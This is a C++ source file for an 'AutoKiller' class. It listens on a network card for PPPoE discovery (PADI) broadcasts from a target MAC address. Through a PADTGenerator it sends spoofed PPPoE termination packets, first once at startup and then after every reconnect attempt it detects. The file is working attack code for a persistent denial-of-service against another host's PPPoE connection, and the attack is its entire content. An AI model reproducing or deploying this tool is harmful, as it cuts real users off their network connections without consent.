#include "AutoKiller.h"
#include "GPacketDetector.h"
#include "PADTGenerator.h"
#include <boost/bind.hpp>
#include <boost/thread/mutex.hpp>

using namespace std;
using namespace glib;

AutoKiller::AutoKiller(unsigned char *src, unsigned char *dst, string & card, unsigned int interval)
					: m_interval(interval)
{
	memcpy(m_srcmac, src, 6);
	memcpy(m_dstmac, dst, 6);
	m_card = card;

	m_logger = GLogger::getLogger("autokiller");
}

AutoKiller::~AutoKiller()
{
	delete m_logger;
}

void AutoKiller::padi_detected(const unsigned char* packet, int len)
{
	PADTGenerator *padt_gnr;

	if(memcmp(packet+6, m_srcmac, 6))
	{
		GDEBUG(*m_logger)("AutoKiller::padi_detected not me");
		return;
	}

	GDEBUG(*m_logger)("AutoKiller::padi_detected");

	msig_detected((const unsigned char*)m_srcmac);

	padt_gnr = new PADTGenerator(m_card, m_dstmac, m_srcmac, m_interval);

	GThread::sleep(1000);
	padt_gnr->start();

	while(padt_gnr->isAlive() == true)
		GThread::sleep(100);

	delete padt_gnr;
}

void AutoKiller::run()
{
	GPacketDetector *padi_dtr;
	PADTGenerator *padt;

	padi_dtr = new GPacketDetector("ether[0]=255 and ether proto 0x8863", m_card);
	padi_dtr->AddReactor(boost::bind(&AutoKiller::padi_detected, this, _1, _2));
	padi_dtr->start();

	// Kill the first time
	padt = new PADTGenerator(m_card, m_dstmac, m_srcmac, m_interval);
	padt->start();
	while(padt->isAlive() == true)
		GThread::sleep(100);
	delete padt;

	while(this->IsStopping() == false)
		GThread::sleep(1000);

	padi_dtr->stop();
	while(padi_dtr->isAlive() == true)
		GThread::sleep(100);

	delete padi_dtr;
}
